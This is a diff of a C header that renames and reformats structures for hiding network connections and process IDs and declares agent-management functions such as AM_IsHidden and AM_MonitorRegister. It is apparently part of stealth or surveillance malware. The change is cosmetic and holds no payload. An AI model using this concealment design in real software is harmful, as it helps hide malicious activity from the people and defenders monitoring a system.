@@ -1,15 +1,19 @@
-typedef struct {
+typedef struct
+{
 	DWORD ip_address;
 	WORD  port;
-} connection_hide_struct;
+} CONNECTION_HIDE;
+
 #define NULL_CONNETCION_HIDE_STRUCT {0,0}
 #define IS_SET_CONNETCION_HIDE_STRUCT(x) (x.ip_address ? TRUE : FALSE)
 #define SET_CONNETCION_HIDE_STRUCT(x,y,z) { x.ip_address=y; x.port=z; }
 #define UNSET_CONNETCION_HIDE_STRUCT(x) { x.ip_address=0; x.port=0; }
 
-typedef struct {
+typedef struct
+{
 	DWORD PID;
-} pid_hide_struct;
+} PID_HIDE;
+
 #define NULL_PID_HIDE_STRUCT {0}
 #define IS_SET_PID_HIDE_STRUCT(x) (x.PID ? TRUE : FALSE)
 #define SET_PID_HIDE_STRUCT(x,y) { x.PID=y; }
@@ -30,5 +34,5 @@ extern BOOL AM_IsHidden(DWORD type, void *elem_par);
 extern DWORD AM_Startup(void);
 extern void AM_SuspendRestart(DWORD);
 extern DWORD AM_MonitorStartStop(DWORD, BOOL);
-extern DWORD AM_MonitorRegister(WCHAR *, DWORD, BYTE *, BYTE *, BYTE *, BYTE *);
+extern DWORD AM_MonitorRegister(const CHAR* agent_name, DWORD agent_tag, BYTE* pDispatch, BYTE* pStartStop, BYTE* pInit, BYTE* pUnRegister);
 extern void AM_IPCAgentStartStop(DWORD, BOOL);
